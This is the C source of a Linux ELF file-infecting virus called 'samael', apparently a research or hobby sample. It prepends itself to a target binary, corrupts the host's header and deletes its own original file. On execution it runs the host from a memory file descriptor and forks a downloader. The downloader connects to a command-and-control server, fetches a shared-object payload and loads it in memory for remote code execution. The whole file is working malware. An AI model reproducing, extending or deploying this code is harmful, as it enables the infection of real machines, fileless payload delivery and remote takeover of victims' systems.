#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/unistd.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

// macros to simplify writing function attributes
#define always_inline __attribute__((always_inline))
#define optimize(x) __attribute__((optimize(x)))

// macro to simple writing the system call to create memory file descriptors
#define memfd_create(x,y) syscall(__NR_memfd_create, x, y)

// default optimization level (will be overwritten by obfuscator script)
#define opt 'g' // gcc docs recommend -Og for edit-compile-debug cycle

#define infection_target "./test"

#define port 1337
#define hostname "localhost"

// reference to allow use of environment pointer
extern char** environ;

// prototypes of all functions used in samael
always_inline optimize(opt) static inline long elf_size(FILE*);
always_inline optimize(opt) static inline int is_infected(char*);
always_inline optimize(opt) static inline void infect(FILE*, FILE*);
always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
always_inline optimize(opt) static inline void load_so(int, int);
always_inline optimize(opt) static inline void process_connection(int);
always_inline optimize(opt) static inline void downloader();

int main(int argc, char** argv){
  // if infection target is not infected infect it
  // else execute the infected host file
  if(!is_infected(infection_target)){
    FILE* host=fopen(infection_target, "rb+");
    FILE* parasite=fopen(argv[0], "rb");
    infect(host, parasite);
    fclose(host);
    fclose(parasite);
  }else{
    FILE* infected=fopen(argv[0], "rb");
    execute_host(infected, argv, environ);
  }
}

long elf_size(FILE* f){
  // calculates the size of an elf by adding
  // the byte offset of the section header
  // with the byte size of the section entries
  // multiplied by the number of entries
  Elf64_Ehdr header;
  fread(&header, 1, sizeof(Elf64_Ehdr), f);
  fseek(f, 0, SEEK_SET);
  return header.e_shoff+(header.e_shentsize*header.e_shnum);
}

int is_infected(char* f){
  // determines if the file f is infected
  // by subtracting the elf_size calculated
  // based on the section header and entries
  // from the final byte offset of the file.
  // if they are not equal size then the file
  // must be infected
  FILE* file = fopen(f, "rb");
  if(file){
    long e_size = elf_size(file);
    fseek(file, 0, SEEK_END);
    long f_size = ftell(file);
    fclose(file);
    if(f_size-e_size != 0){
      return 1;
    }
  }
  return 0;
}

void infect(FILE* h, FILE* p){
  long h_size = elf_size(h);
  long p_size = elf_size(p);
  char* h_buffer = (char*)malloc(sizeof(char)*h_size);
  char* p_buffer = (char*)malloc(sizeof(char)*p_size);

  // the use of 0xFF is arbitary, 256 characters should suffice for common file name length
  char file_link[0xFF];
  char file_name[0xFF];

  // read host and parasite into their respective buffers
  fread(h_buffer, sizeof(char), h_size, h);
  fread(p_buffer, sizeof(char), p_size, p);

  // replaces the host elf magic number with O's
  for(int i = 0; i < 4; ++i){
    *(h_buffer + i) = 0;
  }

  // write parasite to the beginning of the host file then write host back to itself
  fseek(h, 0, SEEK_SET);
  fwrite(p_buffer, sizeof(char), p_size, h);
  fwrite(h_buffer, sizeof(char), h_size, h);

  // get file name of parasite and delete it
  sprintf(file_link, "/proc/self/fd/%d", fileno(p));
  ssize_t len = readlink(file_link, file_name, sizeof(file_name));
  file_name[len] = 0x00; // using 0x00 instead of \0 due to escaping character issue in obfuscator.sh
  remove(file_name);
}

void execute_host(FILE* f, char** argv, char** envp){
  long p_size = elf_size(f);
  fseek(f, p_size, SEEK_SET);
  long h_size = elf_size(f);
  char host[h_size];
  fseek(f, p_size, SEEK_SET);
  fread(host, sizeof(char), h_size, f);

  // put host's elf magic number back
  host[0] = ELFMAG0;
  host[1] = ELFMAG1;
  host[2] = ELFMAG2;
  host[3] = ELFMAG3;

  // create a file in memory and write the host to it
  int fd = memfd_create("", 1);
  write(fd, host, h_size);

  // execute parasites file downloader function as a forked process
  pid_t pid;
  if((pid = fork()) == 0){
    downloader();
  }

  // fork the process to execute the host file
  if((pid = fork()) == 0){
    fexecve(fd, argv, envp);
  }else{
    wait(NULL);
  }
}

void load_so(int socket_fd, int size){
  // read file from socket into buffer and write file data to
  // the memory file descriptor then load .so payload into address space
  // to execute its constructor for remote code execution
  char* file_buff = (char*)malloc(sizeof(char)*size);
  int fd = memfd_create("", 1);
  read(socket_fd, file_buff, sizeof(char)*size);
  close(socket_fd);
  write(fd, file_buff, size);
  free(file_buff);
  void* handle;
  char file_path[20];
  sprintf(file_path, "/proc/self/fd/%d", fd);
  handle = dlopen(file_path, RTLD_LAZY);
  dlclose(handle);
}

void process_connection(int socket_fd){
  // read the first 13 bytes from the socket to get payload file size
  // then execute code to load the .so payload into the process address space
  char buff[13];
  read(socket_fd, buff, sizeof(buff));
  int size = atoi(buff);
  load_so(socket_fd, size);
}

void downloader(){
  int socket_fd;
  int connection = -1;
  struct sockaddr_in server;
  struct hostent *he;
  struct in_addr **addr_list;
  char* ip;

  // resolve hostname to ip addr
  he = gethostbyname(hostname);
  addr_list = (struct in_addr **) he->h_addr_list;
  ip = inet_ntoa(*addr_list[0]);
  
  // set up socket to connect to c2
  socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = inet_addr(ip);

  // loop until connection is established
  while(connection < 0){
    sleep(5);
    connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
  }

  // process the connection to download && load .so payload
  process_connection(socket_fd);
}
